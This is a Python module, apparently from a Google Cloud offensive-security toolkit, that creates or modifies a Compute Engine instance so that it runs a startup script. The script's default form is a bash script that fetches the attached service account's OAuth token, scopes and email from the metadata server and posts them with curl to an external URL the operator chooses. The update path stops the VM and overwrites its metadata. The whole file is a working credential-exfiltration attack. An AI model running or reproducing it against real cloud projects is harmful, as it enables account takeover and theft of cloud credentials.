from Modules.CloudCompute.utils.util_helpers import *

def run_module(user_args, session, first_run = False, last_run = False):
    
    # Set up Argparser to handle flag arguments
    parser = argparse.ArgumentParser(description="Exploit Startup Script Module", allow_abbrev=False)
    parser.add_argument("--instance-name",type=str,required=False,help="Instance name in format projects/[project_id]/zones/[zone]/instances/[name]")
    parser.add_argument("--startup-script-path",type=str,required=False,help="Local path for script you want to set as the startup script")
    parser.add_argument("--external-url",type=str,required=False,help="Exteral URL you want to exfiltrate in the form http(s)://URL")
    parser.add_argument("--service-account",type=str,required=False,help="Service Acccount to attach when creating/updating instance")

    parser.add_argument("--no-service-account",action="store_true",required=False,help="Create/Update instance and attach no service account")
    parser.add_argument("-v","--debug",action="store_true",required=False,help="Get verbose data returned")

    exclusive_function_group_2 = parser.add_mutually_exclusive_group(required=False)
    exclusive_function_group_2.add_argument("--create-new-instance", action="store_true",  help="Create instance with service")
    exclusive_function_group_2.add_argument("--update-via-shutdown", action="store_true", help=f"Update instance with service{UtilityTools.RED}{UtilityTools.BOLD}(Note this will wipe VM & current VM metadata effectively, USE WITH CAUTION){UtilityTools.RESET}")

    args = parser.parse_args(user_args)
    
    action_dict = {}

    debug = args.debug

   # Will be reset depending on instance name passed in
    project_id = session.project_id

    # Needed to call "call_function", does not exist in v2
    instance_client = compute_v1.InstancesClient(credentials = session.credentials)  
    
    instance_name, instance_zone, sa_email, create, update, local_script_file_path = None, None, None, False, False, None

    # Make sure function name adheres to regex
    if args.instance_name:

        if check_instance_format(args.instance_name):

            project_id = args.instance_name.split("/")[1]
            instance_zone = args.instance_name.split("/")[3]
            instance_name = args.instance_name.split("/")[5]

        else:
            print("[X] Incorrect \"instance-name\" format. Ex. projects/[project-id]/zones/[zone]/instances/[instance_name]")
            return -1

    if args.service_account:
        sa_email = args.service_account

    if args.no_service_account:
        sa_email = None

    if args.external_url:
        external_url = args.external_url

    if args.startup_script_path:

        local_script_file_path = args.startup_script_path

    if not (args.create_new_instance or args.update_via_shutdown):
        create_or_update = session.choice_selector(["Create",f"Update {UtilityTools.RED}{UtilityTools.BOLD}(Note this will wipe VM & current VM metadata effectively, USE WITH CAUTION){UtilityTools.RESET}"], "Do you want to create a new instance with the startup exfil script, or update (via shutdown if needed) an existing instance:")
        if create_or_update == "Create":
            create  = True
        elif create_or_update.startswith("Update"):
            update  = True
        else:
            print("[X] Exiting...")
            return -1

    elif args.create_new_instance:
        create  = True
    elif args.update_via_shutdown:
        update  = True
        
    if not instance_name and update:

        rows_returned = session.get_data("cloudcompute-instances", ["name","status","zone","project_id"])
        
        if len(rows_returned) == 0:
            print("[X] Exiting since there are no instances provided or found. Consider passing in instance name with --instance-name if you have it in mind.")
            return -1

        for instance in rows_returned:
            instance_project_id = instance["project_id"]
            instance_name = instance["name"]
            instance_status = instance["status"]
            instance_zone = instance["zone"].split("/")[-1]

            instance["printout"] = f"[{instance_project_id}] {instance_name} (@ {instance_zone}) - STATUS: {instance_status}"

        rows_returned = sorted(rows_returned, key=lambda x: x["zone"])

        instance_dict = session.choice_selector(rows_returned,"Choose an existing instance from below to create or update:", fields=["printout"])
        
        if instance_dict:
            instance_name = instance_dict["name"]
            instance_zone = instance_dict["zone"].split("/")[-1]
            project_id = instance_dict["project_id"]
        
        else:
            print("Exiting...")
            return -1

    elif not instance_name and create:

        instance_name = session.choice_prompt("Provide the instance name to create in the format projects/[project_id]/zones/[zone]/instances/[instance_name]? ", regex = r'^projects/[^/]+/zones/[^/]+/instances/[^/]+$')

        instance_zone = instance_name.split("/")[3]
        project_id = instance_name.split("/")[1]
        instance_name = instance_name.split("/")[5]
        
    if not args.external_url:

        url_response = session.choice_prompt("What URL do you want to have the startup script reach out to with creds (ex. Burp Collab; https://[domain])? ")
        if url_response:
            external_url = url_response
        else:
            print("Exiting...")
            return -1


    if not local_script_file_path:

        default_or_custom = session.choice_selector(["Default","Custom"], "Do you want to use the default custom script, or define your own:")
        if default_or_custom == "Default":
            print("[*] Proceeding with default startup script")

            startup_script_data = f"""#!/bin/bash
            apt-get update
            apt-get install -y curl
            curl {external_url}/gce_token -k -d \"$(curl --header \"Metadata-Flavor:Google\"  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token)\"
            curl {external_url}/scopes -k  -d \"$(curl --header \"Metadata-Flavor:Google\"  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes)\"
            curl {external_url}/email -k  -d \"$(curl --header \"Metadata-Flavor:Google\"  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email)\""""
        
        elif default_or_custom == "Custom":

            local_script_file_path = session.choice_prompt("Enter the local file path for your script: ")

        else:
            print("[X] Exiting...")
            return -1

    if local_script_file_path:

        try:
                
            with open(local_script_file_path, 'r') as file:
                startup_script_data = file.read()   

        except Exception as e:
            print(f"[X] Failed to read in the local file at {local_script_file_path}. Exiting...")
            return -1

    if not (args.no_service_account or sa_email):
        sa_account_or_none = session.choice_selector(["SA Account","No SA Account"], "Do you want to attack a SA account when creating/updating a VM?")
        
        if sa_account_or_none == "SA Account":
            sa_email = session.choose_member(type_of_member = "service_accounts")
            if not sa_email:
                print("[X] Exiting...")
                return -1    
            else:
                sa_email = sa_email.replace("serviceAccount:","")

        elif sa_account_or_none == "No SA Account":
            sa_email = None

        else:
            print("[X] Exiting...")
            return -1

    # At this point instance_name, instancee_zone, and project_id should all be set relative to instance full name
    if create:

        response = create_instance(
            instance_client, 
            instance_name, 
            project_id, 
            instance_zone, 
            startup_script_data = startup_script_data, 
            sa_email = sa_email, 
            debug=False
        )

        if response and response == 1:
            action_dict.setdefault("project_permissions", {}).setdefault(project_id, set()).add("compute.projects.create")   

            if sa_email:
                print(f"{UtilityTools.GREEN}{UtilityTools.BOLD}[*] Successfuly sent tokens to {external_url}. Review the requests for the token and add it via 'creds add <name> --type OAuth2 --token <AccessToken>{UtilityTools.RESET}")  
            else:
                print(f"{UtilityTools.GREEN}{UtilityTools.BOLD}[*] Successfuly created the instance with no service account. Add SSH keys via the `exploit_instance_ssh_keys` module or update the existing instance to add a service account{UtilityTools.RESET}")  

        elif response == -1:
            print(f"{UtilityTools.RED}{UtilityTools.BOLD}[X] An error occurred during execution. It's unclear if the instance was successfully created.{UtilityTools.RESET}")

        elif response == "Not Enabled":

            print(f"{UtilityTools.RED}{UtilityTools.BOLD}[X] Due to the Compute API not being enabled, NO instance should have been created.{UtilityTools.RESET}")


    # Update can involve multipe operations so pass data_dict as argument
    elif update:

        response = update_instance(
            instance_client, 
            instance_name, 
            project_id, 
            instance_zone, 
            action_dict,
            startup_script_data = startup_script_data, 
            sa_email = sa_email, 
            debug=False
        )

        if response and response == 1:
            action_dict.setdefault("project_permissions", {}).setdefault(project_id, set()).add("compute.projects.create")   

            if sa_email:
                print(f"{UtilityTools.GREEN}{UtilityTools.BOLD}[*] Successfuly updated & sent tokens to {external_url}. Review the requests for the token and add it via 'creds add <name> --type OAuth2 --token <AccessToken>{UtilityTools.RESET}")  
            else:
                print(f"{UtilityTools.GREEN}{UtilityTools.BOLD}[*] Successfuly updated the instance with no service account. Add SSH keys via the `exploit_instance_ssh_keys` module or update the existing instance to add a service account{UtilityTools.RESET}")  

        elif response == "Fail Stop":
            print(f"{UtilityTools.RED}{UtilityTools.BOLD}[X] An error occurred while trying to stop (compute.instances.stop) the compute instance.{UtilityTools.RESET}")

        elif response == "Fail Fingerprint":
            print(f"{UtilityTools.RED}{UtilityTools.BOLD}[X] An error occurred while trying to get the current compute metadata fingerprint (compute.instances.get) which is necessary to perform an update. Note the compute instance might now be stopped.{UtilityTools.RESET}")
        
        elif response == "Fail Update":
            print(f"{UtilityTools.RED}{UtilityTools.BOLD}[X] An error occurred while trying to update (compute.instances.update) which is necessary to perform an update. Note the compute instance might now be off.{UtilityTools.RESET}")

        elif response == "Not Enabled":
            print(f"{UtilityTools.RED}{UtilityTools.BOLD}[X] Due to the Compute API not being enabled, No instance should have been updated.{UtilityTools.RESET}")

        elif response == "Fail Start":
            print(f"{UtilityTools.RED}{UtilityTools.BOLD}[X] An error occurred while trying to start (compute.instances.start) the compute instance. Note the update might have occured, but the instance remains off{UtilityTools.RESET}")

    if action_dict:
        session.insert_actions(action_dict, project_id, column_name = "compute_actions_allowed") 


    


 

    



   